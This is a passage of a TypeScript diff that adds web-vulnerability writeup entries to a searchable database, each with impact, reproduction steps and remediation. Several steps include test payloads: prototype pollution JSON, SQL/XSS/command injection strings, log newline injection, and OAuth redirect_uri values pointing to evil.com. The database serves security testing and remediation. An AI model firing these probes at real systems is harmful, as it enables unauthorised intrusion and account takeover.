+  {id:"wup-087",title:"Internal IP Disclosure",category:"Information Disclosure",severity:"Low",cvss_score:3.7,cwe_id:"CWE-200",owasp:"A05:2021",
+   description:"The application discloses internal IP addresses in HTTP response headers, error messages, or HTML comments, revealing internal network topology.",
+   impact:"Exposes internal network architecture, enabling more targeted pivoting attacks if an attacker gains any internal access.",
+   steps_to_reproduce:"1. Check headers: X-Forwarded-For, X-Real-IP, Location\n2. Trigger error pages and check for 10.x, 172.16-31.x, 192.168.x values.\n3. View page source for HTML comments containing IPs.",
+   remediation:"Remove or sanitise headers that might disclose internal IPs. Configure reverse proxy to strip X-Forwarded-For when not needed.",
+   references:["https://cwe.mitre.org/data/definitions/200.html"],tags:["internal IP","information disclosure","headers"]},
+
+  {id:"wup-088",title:"Source Code Disclosure via File Inclusion",category:"Information Disclosure",severity:"High",cvss_score:7.5,cwe_id:"CWE-540",owasp:"A05:2021",
+   description:"Application scripts can be retrieved as raw source code rather than executed, exposing server-side logic, database credentials, and business logic.",
+   impact:"Full source code disclosure including hardcoded credentials, algorithm details, and internal architecture.",
+   steps_to_reproduce:"1. Try appending null byte: index.php%00.txt (older PHP)\n2. Request: index.php~ (backup in some editors)\n3. Check for handler misconfiguration allowing .php served as text",
+   remediation:"Verify web server correctly maps all file types to appropriate handlers. Audit server configuration. Remove all backup files from web root.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/"],tags:["source code","information disclosure","file inclusion"]},
+
+  // ── LOGGING & MONITORING ──────────────────────────────────────────────────
+  {id:"wup-300",title:"Insufficient Security Logging",category:"Logging & Monitoring",severity:"Medium",cvss_score:5.3,cwe_id:"CWE-778",owasp:"A09:2021",
+   description:"The application fails to log security-relevant events such as failed logins, privilege escalation, or access to sensitive data, making incident detection and response impossible.",
+   impact:"Attackers can operate undetected. Forensic investigation after breach is impossible. Compliance requirements (PCI DSS, SOC 2) likely violated.",
+   steps_to_reproduce:"1. Perform multiple failed login attempts.\n2. Check if application logs these events with sufficient detail.\n3. Attempt privilege escalation and check if it's recorded.",
+   remediation:"Log all authentication events, authorisation failures, input validation failures, and administrative actions. Include timestamp, user ID, source IP, and action. Store logs centrally and protect from tampering.",
+   references:["https://owasp.org/www-project-top-ten/2021/A09_2021-Security_Logging_and_Monitoring_Failures.html","https://cwe.mitre.org/data/definitions/778.html"],tags:["logging","monitoring","SIEM","OWASP Top 10"]},
+
+  {id:"wup-301",title:"Log Injection",category:"Logging & Monitoring",severity:"Medium",cvss_score:5.4,cwe_id:"CWE-117",owasp:"A09:2021",
+   description:"User input is written to log files without sanitisation, allowing attackers to forge log entries, inject newlines to create fake events, or exploit log viewers.",
+   impact:"Log forgery (hide attack evidence), exploit log viewer vulnerabilities, inject misleading forensic data.",
+   steps_to_reproduce:"1. Inject newline characters in logged fields: username=admin%0aINFO: Login successful: admin\n2. Observe injected entry in logs as a separate line.",
+   remediation:"Sanitise all data before logging — encode newlines and special characters. Use structured logging (JSON) which prevents newline injection. Apply parameterised logging APIs.",
+   references:["https://owasp.org/www-community/attacks/Log_Injection","https://cwe.mitre.org/data/definitions/117.html"],tags:["log injection","logging","CRLF injection"]},
+
+  // ── MISCELLANEOUS HIGH-IMPACT ─────────────────────────────────────────────
+  {id:"wup-400",title:"HTTP Request Smuggling",category:"Security Misconfiguration",severity:"High",cvss_score:8.1,cwe_id:"CWE-444",owasp:"A05:2021",
+   description:"Discrepancies between how a front-end proxy and back-end server parse HTTP request boundaries (Content-Length vs Transfer-Encoding headers) allow injection of requests into other users' connections.",
+   impact:"Session hijacking, request forgery, access control bypass, cache poisoning, XSS via reflected headers.",
+   steps_to_reproduce:"1. Send ambiguous request with both Content-Length and Transfer-Encoding: chunked\n2. Use Burp Suite HTTP request smuggler extension\n3. Observe responses from other users' requests",
+   remediation:"Use HTTP/2 end-to-end to eliminate ambiguity. Normalise requests at the front-end before passing to back-end. Disable reuse of back-end connections after ambiguous requests.",
+   references:["https://portswigger.net/web-security/request-smuggling","https://cwe.mitre.org/data/definitions/444.html"],tags:["request smuggling","HTTP","proxy","CL.TE","TE.CL"]},
+
+  {id:"wup-401",title:"Cache Poisoning",category:"Security Misconfiguration",severity:"High",cvss_score:8.1,cwe_id:"CWE-436",owasp:"A05:2021",
+   description:"The caching layer stores malicious responses triggered by manipulating unkeyed inputs (headers, parameters) and serves them to other users.",
+   impact:"Persistent XSS affecting all users, denial of service for cached resources, phishing via cached malicious content.",
+   steps_to_reproduce:"1. Identify unkeyed cache inputs: X-Forwarded-Host, X-Original-URL\n2. Inject malicious value and observe it reflected in response.\n3. Confirm cached: X-Cache: HIT on subsequent request.",
+   remediation:"Disable caching of responses with unkeyed inputs. Include all security-sensitive headers in cache key. Use cache-control: no-store for personalised responses.",
+   references:["https://portswigger.net/web-security/web-cache-poisoning","https://cwe.mitre.org/data/definitions/436.html"],tags:["cache poisoning","CDN","XSS","DoS"]},
+
+  {id:"wup-402",title:"Prototype Pollution",category:"Injection",severity:"High",cvss_score:7.5,cwe_id:"CWE-1321",owasp:"A03:2021",
+   description:"JavaScript object prototype can be polluted via user-controlled keys containing __proto__, constructor, or prototype, affecting all objects and potentially leading to RCE in Node.js.",
+   impact:"Property injection into all JS objects, logic bypass, potential RCE in Node.js via child_process or eval, DoS.",
+   steps_to_reproduce:"1. Send JSON: {\"__proto__\":{\"polluted\":true}}\n2. Or: a[__proto__][polluted]=true in URL\n3. Check if ({}).polluted === true in application code",
+   remediation:"Validate and sanitise object keys. Use Object.create(null) for dictionaries. Use JSON schema validation. Use safe merge libraries. Block __proto__, constructor, prototype keys.",
+   references:["https://portswigger.net/web-security/prototype-pollution","https://cwe.mitre.org/data/definitions/1321.html"],tags:["prototype pollution","JavaScript","Node.js","injection"]},
+
+  {id:"wup-403",title:"Subdomain Takeover",category:"DNS",severity:"High",cvss_score:8.1,cwe_id:"CWE-350",owasp:"A05:2021",
+   description:"A subdomain's DNS CNAME points to a third-party service (GitHub Pages, Heroku, Shopify, etc.) that is no longer provisioned, allowing anyone to claim it and serve content under the original subdomain.",
+   impact:"Phishing attacks using the trusted subdomain, session cookie theft if cookies scope to parent domain, reputation damage.",
+   steps_to_reproduce:"1. Enumerate subdomains: subfinder -d target.com\n2. Check each for CNAME to third-party service.\n3. Request the subdomain and check for 'unclaimed' error page.\n4. Register the service with the same name.",
+   remediation:"Implement a process to remove DNS records before deprovisioning services. Regularly audit DNS records. Use CNAME flattening where possible.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover"],tags:["subdomain takeover","DNS","CNAME","phishing"]},
+
+  {id:"wup-404",title:"Dependency Confusion Attack",category:"Vulnerable Components",severity:"High",cvss_score:8.8,cwe_id:"CWE-829",owasp:"A06:2021",
+   description:"Internal package names are registered by an attacker on public registries (npm, PyPI, RubyGems) with higher version numbers, causing build systems to download the malicious public version.",
+   impact:"Supply chain compromise — malicious code executes during build or runtime with the privileges of the build system or application.",
+   steps_to_reproduce:"1. Identify internal package names from package.json, requirements.txt, or job postings.\n2. Check if they exist on public registries.\n3. If not, register with higher version number.",
+   remediation:"Use scoped packages (@company/package). Configure npm/pip to only use private registry for internal packages. Use package lockfiles and integrity hashes.",
+   references:["https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"],tags:["supply chain","dependency confusion","npm","PyPI","build"]},
+
+  {id:"wup-405",title:"Clickjacking – Double-Click Hijacking",category:"Clickjacking",severity:"Medium",cvss_score:5.4,cwe_id:"CWE-1021",owasp:"A05:2021",
+   description:"Newer variant of clickjacking using double-click events, which are not mitigated by pointer-events:none CSS and can bypass some clickjacking protections.",
+   impact:"User can be tricked into performing sensitive actions (OAuth approval, file deletion, payment confirmation) via double-click.",
+   steps_to_reproduce:"1. Create hidden iframe over sensitive button.\n2. Position decoy content to attract double-click.\n3. Confirm action executes in embedded page.",
+   remediation:"Use CSP frame-ancestors 'none'. Implement token-based confirmation for sensitive actions. Add time-based delays before confirming security-critical actions.",
+   references:["https://owasp.org/www-community/attacks/Clickjacking"],tags:["clickjacking","double-click","iframe","user interaction"]},
+
+  // ── PASSWORD POLICY ───────────────────────────────────────────────────────
+  {id:"wup-500",title:"Password Stored in Plaintext",category:"Password Policy",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-256",owasp:"A02:2021",
+   description:"User passwords are stored in the database as plaintext or with reversible encryption, meaning any database breach immediately exposes all user credentials.",
+   impact:"All user credentials exposed in a single database breach. Credential stuffing across other sites. No ability for users to protect themselves after breach.",
+   steps_to_reproduce:"1. Register with a known password.\n2. Query the database directly (if possible) or check password reset email for original password.\n3. Or: check if 'forgot password' emails the original password.",
+   remediation:"Use bcrypt, Argon2id, or scrypt for password hashing. NEVER store plaintext or reversibly encrypted passwords. Migrate existing passwords on next login.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/256.html"],tags:["password","plaintext","hashing","critical","CWE Top 25"]},
+
+  {id:"wup-501",title:"Password Not Checked Against Breach Databases",category:"Password Policy",severity:"Low",cvss_score:3.7,cwe_id:"CWE-521",owasp:"A07:2021",
+   description:"The application does not check new passwords against known-breached password lists (HaveIBeenPwned), allowing users to set passwords that are already in attacker wordlists.",
+   impact:"Users with breached passwords are highly vulnerable to credential stuffing attacks.",
+   steps_to_reproduce:"1. Attempt to register with: password123, 12345678, qwerty, letmein\n2. Observe all are accepted without breach warning.",
+   remediation:"Integrate HaveIBeenPwned k-anonymity API to check passwords on registration and change. Reject passwords found in breach databases.",
+   references:["https://haveibeenpwned.com/API/v3","https://pages.nist.gov/800-63-3/sp800-63b.html"],tags:["password","breach","HaveIBeenPwned","NIST"]},
+
+  // ── SOCIAL ENGINEERING ────────────────────────────────────────────────────
+  {id:"wup-600",title:"Email Spoofing – Missing SPF/DKIM/DMARC",category:"Social Engineering",severity:"Medium",cvss_score:6.5,cwe_id:"CWE-290",owasp:"A05:2021",
+   description:"The domain does not implement SPF, DKIM, and DMARC email authentication, allowing attackers to send emails appearing to come from the target's domain.",
+   impact:"Phishing attacks using the legitimate domain to target employees and customers, credential harvesting, wire fraud.",
+   steps_to_reproduce:"1. dig TXT target.com | grep -E 'v=spf|v=DMARC'\n2. Check for missing/permissive records: ~all vs -all in SPF\n3. Use an online spoofing tester to send a test email.",
+   remediation:"Implement SPF with -all (hard fail). Add DKIM signing for all outbound mail. Configure DMARC with p=reject policy. Monitor DMARC reports.",
+   references:["https://dmarc.org/","https://www.cloudflare.com/learning/email-security/what-is-email-spoofing/"],tags:["SPF","DKIM","DMARC","email spoofing","phishing"]},
+
+  // ── TLS CONTINUED ─────────────────────────────────────────────────────────
+  {id:"wup-143",title:"HSTS Preloading Not Configured",category:"TLS / SSL",severity:"Low",cvss_score:3.7,cwe_id:"CWE-319",owasp:"A02:2021",
+   description:"HSTS is configured but not submitted to browser preload lists, meaning first-time visitors (before receiving the HSTS header) are still vulnerable to SSL stripping.",
+   impact:"First-visit SSL stripping attacks possible for users who have never visited the site before.",
+   steps_to_reproduce:"1. Check HSTS header for includeSubDomains and preload directives.\n2. Check https://hstspreload.org/ for domain registration status.",
+   remediation:"Add 'preload' directive to HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Submit domain to https://hstspreload.org/",
+   references:["https://hstspreload.org/","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"],tags:["HSTS","preload","TLS","SSL stripping"]},
+
+  {id:"wup-144",title:"Certificate Transparency Log Monitoring Not Implemented",category:"TLS / SSL",severity:"Info",cvss_score:null,cwe_id:"CWE-693",owasp:"A05:2021",
+   description:"The organisation does not monitor Certificate Transparency logs for unauthorised certificates issued for their domains, leaving them unable to detect certificate misissuance.",
+   impact:"Attackers who obtain fraudulent certificates can conduct MitM attacks undetected for extended periods.",
+   steps_to_reproduce:"1. Check crt.sh for all certificates issued for the domain.\n2. Verify all certificates are expected and authorised.\n3. Confirm no monitoring/alerting process exists.",
+   remediation:"Subscribe to CT log monitoring services (Facebook CT Monitor, sslmate.com/certspotter). Implement CAA DNS records to restrict which CAs can issue for your domain.",
+   references:["https://certificate.transparency.dev/","https://letsencrypt.org/docs/caa/"],tags:["CT logs","certificate transparency","TLS","monitoring"]},
+
+  // ── OAUTH (continued) ─────────────────────────────────────────────────────
+  {id:"wup-181",title:"OAuth – Token Leakage via Referrer",category:"OAuth",severity:"High",cvss_score:7.5,cwe_id:"CWE-598",owasp:"A07:2021",
+   description:"OAuth access tokens or authorisation codes are exposed in URLs and subsequently leaked via HTTP Referer headers to third-party resources on the redirect page.",
+   impact:"Access token theft allowing impersonation of the victim for the lifetime of the token.",
+   steps_to_reproduce:"1. Complete OAuth flow and note if token appears in URL fragment or query parameter.\n2. Check if redirect page loads external resources (analytics, fonts).\n3. Intercept requests from redirect page and check Referer header.",
+   remediation:"Use PKCE for public clients. Transmit tokens via POST body not URL. Set Referrer-Policy: no-referrer on OAuth callback pages. Use fragment (#) not query (?) for implicit flow tokens.",
+   references:["https://datatracker.ietf.org/doc/html/rfc6749","https://portswigger.net/web-security/oauth"],tags:["OAuth","token leakage","referrer","authorization code"]},
+
+  {id:"wup-182",title:"OAuth – Open Redirect in Redirect URI",category:"OAuth",severity:"High",cvss_score:8.1,cwe_id:"CWE-601",owasp:"A07:2021",
+   description:"The OAuth server accepts redirect URIs that can be manipulated via path traversal or wildcard matching to redirect authorisation codes to attacker-controlled URIs.",
+   impact:"Authorisation code theft — attacker can exchange stolen code for access token and take over the victim's OAuth session.",
+   steps_to_reproduce:"1. Modify redirect_uri: redirect_uri=https://legitimate.com@evil.com\n2. Or: redirect_uri=https://legitimate.com/../../evil\n3. Observe if code is sent to manipulated URI.",
+   remediation:"Enforce exact redirect URI matching (no wildcards, no partial matching). Validate against a pre-registered allowlist. Reject any redirect URI manipulation.",
+   references:["https://portswigger.net/web-security/oauth","https://datatracker.ietf.org/doc/html/rfc6749#section-10.6"],tags:["OAuth","open redirect","redirect URI","authorization code theft"]},
+
+  // ── WEBSOCKET (continued) ─────────────────────────────────────────────────
+  {id:"wup-201",title:"WebSocket – Lack of Input Validation",category:"WebSocket",severity:"High",cvss_score:7.5,cwe_id:"CWE-20",owasp:"A03:2021",
+   description:"WebSocket messages are not validated server-side, allowing injection attacks (XSS, SQLi, command injection) via the WebSocket channel which may bypass WAF rules.",
+   impact:"All injection vulnerability classes are exploitable via the WebSocket channel, often bypassing perimeter security controls.",
+   steps_to_reproduce:"1. Connect to WebSocket endpoint.\n2. Send injection payloads: <script>alert(1)</script>, ' OR 1=1--, $(id)\n3. Observe if payloads are processed without validation.",
+   remediation:"Apply the same input validation and sanitisation to WebSocket messages as to HTTP requests. Authenticate each WebSocket message. Log and monitor WebSocket traffic.",
+   references:["https://portswigger.net/web-security/websockets"],tags:["WebSocket","injection","input validation","XSS"]},
+
+];
+
+// Merge into main DB
+export const WRITEUPS_DB_FULL: Writeup[] = [...WRITEUPS_DB, ...WRITEUPS_EXTENDED];
+
+// Override the original exports to use the full DB
+export function searchWriteupsAll(query: string): Writeup[] {
+  if (!query.trim()) return WRITEUPS_DB_FULL;
+  const q = query.toLowerCase();
+  return WRITEUPS_DB_FULL.filter(w =>
+    w.title.toLowerCase().includes(q) ||
+    w.category.toLowerCase().includes(q) ||
+    w.cwe_id.toLowerCase().includes(q) ||
+    w.owasp.toLowerCase().includes(q) ||
+    w.tags.some(t => t.toLowerCase().includes(q)) ||
+    w.description.toLowerCase().includes(q)
+  );
+}
